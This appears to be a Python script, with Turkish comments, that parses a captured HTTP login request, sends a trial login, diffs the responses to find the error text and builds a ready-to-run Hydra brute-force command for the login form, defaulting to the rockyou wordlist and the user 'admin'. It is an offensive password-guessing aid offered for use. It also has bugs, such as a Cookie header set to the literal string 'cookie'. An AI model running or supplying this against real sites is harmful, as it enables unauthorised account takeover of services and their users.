#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
import os, difflib
import argparse

banner = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡆⠀⠀⠀⠀⢀⣶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣧⣤⣤⣶⣶⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢻⣿⣿⣿⣿⣿⢋⣿⢿⡆⠀⠀⠖⠀⠀⠀⠀⠀⢤⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣠⣾⣿⣿⣿⣿⣿⣿⠿⢁⢸⣿⠀⢸⢠⣀⣀⡀⠀⠀⠹⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡀⠸⢿⣿⡿⠿⠋⠀⢀⣾⢸⣿⢀⠜⠁⣸⡟⠷⣾⣴⣀⠙⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣷⣷⣶⣶⣶⣶⣂⡀⠀⠐⢄⠠⣄⣠⣤⣄⣼⣿⠁⣼⣿⡇⣀⣈⠉⠉⠀⠉⢹⣿⡇⢻⣿⣆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⡿⠿⠿⠿⢿⣿⣿⣿⣿⣷⣀⢆⠉⣿⡟⠛⢻⣿⠟⢰⣿⣿⣇⡅⠈⡇⠈⠀⠀⠀⠀⠀⣾⣿⠻⣆⠀⠀
⠀⠀⠀⠀⠀⣠⡞⣻⠿⠋⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⡄⢆⠉⠁⠀⠉⠀⠁⢀⣾⣿⠟⠛⠁⠀⠁⠀⠀⠀⠀⠀⢀⣿⣿⠀⠀⠀⠀
⠀⠀⠀⡄⠚⠋⢠⠐⢺⠿⠀⡴⠐⠂⠐⠂⢠⡀⠀⢻⣿⣿⡿⡄⠇⠀⠀⠀⠀⢀⣾⣿⠃⠀⠀⢀⠈⠀⠀⠀⠀⠀⠀⣼⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠈⠒⠀⠽⡄⡾⢀⠔⠁⠀⠀⠀⠀⠀⠁⠀⣸⣿⣿⣇⡜⠑⠀⠀⡀⠀⣼⣿⠉⠀⣀⠔⠁⠀⠀⠀⠀⠀⢠⣾⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠱⣁⠂⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡿⠋⠀⠀⠀⠀⢀⣾⡿⡣⠠⠊⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⣿⡀⠀⠀⠀⠀⠀⢀⠈⢀⣾⡿⠋⠀⠀⠀⠀⢀⣴⠟⠋⠉⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠹⠟⠀⠀⠀⠀⡠⠁⠀⡾⠋⠀⠀⠀⠀⠀⠀⠋⠁⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⡿⠁⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠘⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⢿⠟⣡⣿⣯⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⣿⣷⣤⣾⣿⣿⣷⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⣿⣿⣿⣿⣿⣿⠟⠛⠉⠉⠉⠙⢿⣿⣿⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢉⠹⠛⠉⠀⠀⠀⠀⠀⠀⢀⣼⣿⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣬⣷⣶⣶⠒⣶⣤⣴⣴⠒⠈⠀⢀⣠⣤⣶⣶⣶⣶⣦⣤⣴⣶⣿⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⢿⡙⠄⠙⠀⢻⣿⢸⠇⠀⠀⣴⡿⠛⠉⠁⠀⠈⠉⠉⠛⢛⡿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⢸⣿⠁⠀⠀⠀⠀⠀⠀⣠⣶⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣦⣀⠀⠀⠀⠀⣨⣽⠟⠻⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⢷⠾⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""








# Method ve Path bilgilerini getirir
def top(source):
    maddeler = source.strip().split('\n')
    method, path, protocol = maddeler[0].split()
    return method, path, protocol

# Url Formatını getirir
def get_url(source):
    maddeler = source.strip().split('\n')
    ip = maddeler[1].split(':')[1].strip()
    url = "http://" + ip + maddeler[0].split()[1]
    return url


def get_ip(source):
    maddeler = source.strip().split('\n')
    ip = maddeler[1].split(':')[1].strip()
    return ip


# Header Bilgilerini getirir
def get_headers(source):
    maddeler = source.strip().split('\n')
    headers = {}
    for i in range(1, len(maddeler)):
        if maddeler[i] == '':
            break
        key, value = maddeler[i].split(': ')
        headers[key] = value
    return headers


# Brute Force atılacak input bilgilerini çekme [Eksik => dataların ilk 2 kısmını seçiyor]
def get_data(source):
    # pdb.set_trace()
    lines = source.split('\n')
    data_line = lines[::-1]
    for line in data_line:
        if line == '':
            continue
        else:
            form_data = line.split('&')
            break
    data_list = []
    
    if form_data[0].count('=') == 1:
        key, value = form_data[0].split('=')
        data_list.append(f"{key}=^USER^")
    
    if form_data[1].count('=') == 1:
        key, value = form_data[1].split('=')
        data_list.append(f"{key}=^PASS^")
    
    fin_data = '&'.join(data_list)
    return fin_data


# İlk bağlantı isteğini atar
def try_connect(url, method, header, data=None):
    sessions = requests.Session()
    first_response = sessions.get(url)
    cookie = first_response.cookies
    header['Cookie'] = f'cookie'

    responses =[]
    responses.append(first_response)

    if method == 'POST':
        try:
            response = sessions.post(url, headers=header, data=data)
            if response.status_code == 200:
                responses.append(response)
                return responses
            else:
                print("Your connection not able to connect > ", response.status_code)
        except Exception as e:
            print('Post Request Error => \n', e)
    elif method == 'GET':
        try:
            response = sessions.get(url, headers=header)
            if response.status_code == 200:
                responses.append(response)
                return responses
            else:
                print("Your connection not able to connect > ", response.status_code)
        except Exception as e:
            print('Get Request Error => \n', e)





# Find The Error Message by Comparing The Site Before and After The Trial
def compare_website_source(url1, url2):
    try:
        source_code1 = url1.text
        source_code2 = url2.text

        differ = difflib.Differ()
        diff = list(differ.compare(source_code1.splitlines(), source_code2.splitlines()))

        difference_string = '\n'.join(line[2:] for line in diff if line.startswith('+ ')).strip()
        soup = BeautifulSoup(difference_string, "html.parser")
        text = soup.get_text()
        return text
    
    except Exception as e:
        return str(e)



def final_command(username, password, method, ip, path, data, error_message):
    if "/" in username:
        selection = '-L'
    else:
        selection = '-l'
        
    if method == 'GET':
        urllly = "sudo hydra " + f"{selection} " + f"{username} " + "-P " + f"{password} " + f"{ip} " + "http-get-form " + f"\"{path}:{data}:{error_message}\""
    elif method == 'POST':
        urllly = "sudo hydra " + f"{selection} " + f"{username} " + "-P " + f"{password} " + f"{ip} " + "http-post-form " + f"\"{path}:{data}:{error_message}\""
    return urllly


# Controls of Functions
def controller():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(banner)
    print("Example >", 'sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!')
    print("Url >", get_url(source))
    print("Top >", top(source))
    print("Headers >", get_headers(source))
    print("Data >", get_data(source))
    print("Difference >", compare_website_source(try_web[0], try_web[1]))


if __name__ == "__main__":
    # Clear Screen
    os.system('cls' if os.name == 'nt' else 'clear')

    # Args Parser
    parser = argparse.ArgumentParser(description='Get Command for Hydra Brute Force Tool')
    parser.add_argument('-r', '--file', help='File of the target', required=True)
    parser.add_argument("-u", "--username", help="Username or username wordlist of the target", required=True, default="admin")
    parser.add_argument("-p", "--password", help="Password list of the target", required=False, default="/usr/share/wordlists/rockyou.txt")
    args = parser.parse_args()
    file_name = args.file
    username = args.username
    password = args.password


    # Open Request File
    source_request = open(file_name, 'r')
    source = source_request.read()

    # Get Data
    head = top(source) # Post
    header = get_headers(source) 
    datas = get_data(source)
    url = get_url(source) # http://127.0.0.1/login
    ip = get_ip(source) # 127.0.0.1
    method = head[0] # POST
    # Find Difference between before and after
    try_web = try_connect(url, head[0], header, data=datas) 
    difference = compare_website_source(try_web[0], try_web[1]) # Your username or password is incorrect.

    # Get Final Command
    last_uri = final_command(username=username, password=password, method=method,ip=ip, path=head[1], data=datas, error_message=difference)
    
    #Output
    print(banner)
    print("\n")
    print("Final Command =>")
    print(last_uri)
    